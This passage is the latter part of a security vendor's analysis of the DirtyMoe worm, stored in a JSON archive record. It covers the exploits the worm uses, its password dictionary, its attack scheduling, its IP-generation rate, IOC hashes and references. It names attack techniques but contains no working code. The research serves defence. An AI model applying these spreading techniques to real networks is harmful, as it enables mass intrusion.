1458\n\n```\n`CVE:2018-` Deserialization Vulnerability\n```\n 0147\n\n```\n`CVE:2017-` EternalBlue SMB Remote Code Execution (MS17-010)\n```\n 0144\n\n```\n`MS15-076` RCE Allow Elevation of Privilege (Hot Potato Windows Privilege\nEscalation)\n\n**Table 2. Used exploits**\n**C&C Servers**\n\nThe C&C servers determine which module will be deployed on a victim machine. The\nmechanism of the worming module selection depends on client information additionally sent\nto the C&C servers. However, details of how this module selection works remain to be\ndiscovered.\n\n**Password Dictionary**\n\nThe password dictionary is a collection of the most commonly used passwords obtained\nfrom the internet. The dictionary size is 100,000 words and numbers across several topics\nand languages. There are several language mutations for the top world languages, e.g.,\nEnglish, Spanish, Portuguese, German, French, etc. (passwort, heslo, haslo, lozinka,\nparool, wachtwoord, jelszo, contrasena, motdepasse). Other topics are cars (volkswagen,\nfiat, hyundai, bugatti, ford) and art (davinci, vermeer, munch, michelangelo, vangogh). The\ndictionary also includes dirty words and some curious names of historical personalities like\nhitler, stalin, lenin, hussein, churchill, putin, etc.\n\nThe dictionary is used for SCMR, WMI, and SQL attacks. However, the SQL module hardcodes another 15 pairs of usernames/passwords also collected from the internet. The SQL\npasswords usually are default passwords of the most well-known systems.\n\n**Worming Workflow**\n\n\n-----\n\nThe modules also implement a technique for repeated attacks on machines with live\ntargeted ports, even when the first attack was unsuccessful. The attacks can be scheduled\nhourly or daily based on the worm configuration. This approach can prevent a firewall from\nblocking an attacking machine and reduce the risk of detection.\n\nAnother essential attribute is the closing of TCP port 445 port following a successful exploit\nof a targeted system. This way, compromised machines are “protected” from other malware\nthat abuse the same vulnerabilities. The MSI installer also includes a mechanism to prevent\noverwriting DirtyMoe by itself so that the configuration and already downloaded modules\nare preserved.\n\n**IP Generation Performance**\n\nThe primary key to this worm’s success is the performance of the IP generator. We have\nused empirical measurement to determine the performance of the worming module. This\nmeasurement indicates that one module instance can generate and attack 1,500 IPs per\nsecond on average. However, one of the tested instances could generate up to 6,000\nIPs/sec, so one instance can try two million IPs per day.\n\nThe evidence suggests that approximately 1,900 instances can generate the whole IPv4\nrange in one day; our detections estimate more than 7,000 active instances exist in the wild.\nIn theory, the effect is that DirtyMoe can generate and potentially target the entire IPv4\nrange three times a day.\n\n**8. Conclusion**\n\nThe primary goal of this research was to analyze one of the DirtyMoe module groups, which\nprovides the spreading of the DirtyMoe malware using worming techniques. The second\naim of this study was to investigate the effects of worming and investigate which exploits\nare in use.\n\nIn most cases, DirtyMoe is deployed using external exploit kits like PurpleFox or injected\ninstallers of Telegram Messenger that require user interaction to successful infiltration.\nImportantly, worming is controlled by C&C and executed by active DirtyMoe instances, so\nuser interaction is not required.\n\nWorming target IPs are generated utilizing the cleverly designed algorithm that evenly\ngenerates IP addresses across the world and in relation to the geological location of the\nworming module. Moreover, the module targets local/home networks. Because of this,\npublic IPs and even private networks behind firewalls are at risk.\n\nVictims’ active machines are attacked using EternalBlue exploits and dictionary attacks\naimed at SCMR, WMI, and MS SQL services with weak passwords. Additionally, we have\ndetected a total of six vulnerabilities abused by the worming module that implement publicly\ndisclosed exploits.\n\n\n-----\n\nWe also discovered one worming module in development containing other vulnerability\nexploit implementations – it did not appear to be fully armed for deployment. However, there\nis a chance that tested exploits are already implemented and are spreading in the wild.\n\nBased on the amount of active DirtyMoe instances, it can be argued that worming can\nthreaten hundreds of thousands of computers per day. Furthermore, new vulnerabilities,\nsuch as Log4j, provide a tremendous and powerful opportunity to implement a new worming\nmodule. With this in mind, our researchers continue to monitor the worming activities and\nhunt for other worming modules.\n\n**IOCs**\n\nCVE-2019-1458: “WizardOpium’ Local Privilege Escalation\n\n```\nfef7b5df28973ecf8e8ceffa8777498a36f3a7ca1b4720b23d0df18c53628c40\n\n```\n\nSMB worming modules\n```\nf78b7b0faf819328f72a7181ed8cc52890fedcd9bf612700d7b398f1b9d77ab6\ndc1dd648287bb526f11ebacf31edd06089f50c551f7724b98183b10ab339fe2b\n\n```\n\nSQL worming modules\n```\ndf8f37cb2f20ebd8f22e866ee0e25be7d3731e4d2af210f127018e2267c73065\nb3e8497a4cf00489632e54e2512c05d9c80288c2164019d53615dd53c0977fa7\n\n```\n\nWorming modules in development\n\n```\n36e0e1e4746d0db1f52aff101a103ecfb0414c8c04844521867ef83466c75340\n\n```\n\n**References**\n\n[1] [Malicious Telegram Installer Drops Purple Fox Rootkit](https://blog.minerva-labs.com/malicious-telegram-installer-drops-purple-fox-rootkit)\n\n[2] [Purple Fox Rootkit Now Propagates as a Worm](https://www.guardicore.com/labs/purple-fox-rootkit-now-propagates-as-a-worm/)\n\n[3] [Exploit-db: ‘EternalBlue’ SMB Remote Code Execution (MS17-010)](https://www.exploit-db.com/exploits/42031)\n\n[4] [Threat Spotlight: The Shadow Brokers and EternalPulsar Malware](https://blogs.blackberry.com/en/2017/08/threat-spotlight-the-shadow-brokers-and-eternalpulsar-malware)\n\n[5] [Service Control Manager Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f)\n\n[6] [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)\n\n[7] [Exploit-db: ThinkPHP – Multiple PHP Injection RCEs (Metasploit)](https://www.exploit-db.com/exploits/48333)\n\n[8] [Exploit-db: Deserialization Vulnerability](https://www.exploit-db.com/exploits/44756)\n\n[9] [Exploit-db: ‘AsyncResponseService’ Deserialization RCE (Metasploit)](https://www.exploit-db.com/exploits/46814)\n\n[Tagged asanalysis,](https://decoded.avast.io/tag/analysis/) [DirtyMoe,](https://decoded.avast.io/tag/dirtymoe/) [malware,](https://decoded.avast.io/tag/malware/) [passwords,](https://decoded.avast.io/tag/passwords/) [reversing,](https://decoded.avast.io/tag/reversing/) [series,](https://decoded.avast.io/tag/series/) [worm](https://decoded.avast.io/tag/worm/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-16 - DirtyMoe- Worming Modules.pdf"
    ],
    "report_names": [
        "2022-03-16 - DirtyMoe- Worming Modules.pdf"
    ],
    "threat_actors": [
        {
            "id": "d4f7cf97-9c98-409c-8b95-b80d14c576a5",
            "created_at": "2022-10-25T16:07:24.561104Z",
            "updated_at": "2025-03-27T02:02:10.281202Z",
            "deleted_at": null,
            "main_name": "Shadow Brokers",
            "aliases": [],
            "source_name": "ETDA:Shadow Brokers",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "171b85f2-8f6f-46c0-92e0-c591f61ea167",
            "created_at": "2023-01-06T13:46:38.830188Z",
            "updated_at": "2025-03-27T02:00:02.929729Z",
            "deleted_at": null,
            "main_name": "The Shadow Brokers",
            "aliases": [
                "Shadow Brokers",
                "ShadowBrokers",
                "The ShadowBrokers",
                "TSB"
            ],
            "source_name": "MISPGALAXY:The Shadow Brokers",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535711,
    "ts_updated_at": 1743041507,
    "ts_creation_date": 1653691057,
    "ts_modification_date": 1653691057,
    "files": {
        "pdf": "https://archive.orkl.eu/7debde5bc96efd518c3a26963d94c0392b0b52d6.pdf",
        "text": "https://archive.orkl.eu/7debde5bc96efd518c3a26963d94c0392b0b52d6.txt",
        "img": "https://archive.orkl.eu/7debde5bc96efd518c3a26963d94c0392b0b52d6.jpg"
    }
}